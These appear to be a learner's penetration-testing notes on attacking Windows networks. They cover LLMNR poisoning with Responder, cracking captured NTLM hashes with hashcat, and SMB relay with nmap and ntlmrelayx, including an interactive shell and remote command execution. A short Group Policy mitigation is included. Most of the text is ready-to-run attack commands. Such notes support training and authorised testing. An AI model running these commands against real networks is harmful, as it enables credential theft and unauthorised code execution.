## LLMNR poisoning overview

Protocol Used to identift hist when DNS resolution is impossible.
We can intercept traffic in a network containing username and hash

sudo responder -I eth0 -dwP

## Capturing hashes with Responder

sudo responder -I eth0 -dwP
-d answer for DHCP broadcast request
-w wpad rogue proxy server. It allows browser to automatically detect proxy
-P force authentication for the proxy

From target machine we try to reach attacker from file explorer \\192.168.138.134
We get ntml hash

## Cracking our captured hash

Copy full hash, paste it in a file to crack it using hashcat.
If hash is unknown use 'hash-identifieer'

hashcat --help | grep ntlm

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show to only show cracked password

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force to force hashcat

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r OneRule to mutate the used password from our wordlist

## LLMNR poisoning mitigation

Group Policy Management > Computer configuration > Policies > Administrative Template > Network > Dns CLient> Turn off multicast name resolution

We can require to have LLMNR but add permission settings, based on MAC address as example, or require complex password policy

## SMB Relay Attacks Overview

Relay the hash via SMB instead of cracking haches.
To work SMB signing must be disabled or not enforced on the target
Relayed user credentials must be admin on machine for any real value for us

We can identify host wihtout SMB signing using 
nmap --script=smb2-security-mode.nse -p445 10.0.0.25

To enbale this attack we must modify Responder conf (/usr/share/responder.conf) to turn off SMB and HTTP servers as we want to be able to relay hashes and not capture.

Once Responder is running we will run another tool called ntlmrelayx.py
ntlmrelayx -tf targets.txt -smb2support
targets.txt contains the host we identify with nmap as SMB relayable

Can also use :
ntlmrelayx -tf targets.txt -smb2support -I
-I enables to get an interactive shell to browse shares (#shares, # use ADMIN$, #ls)

Or execute commands
ntlmrelayx -tf targets.txt -smb2support -c "whoami"

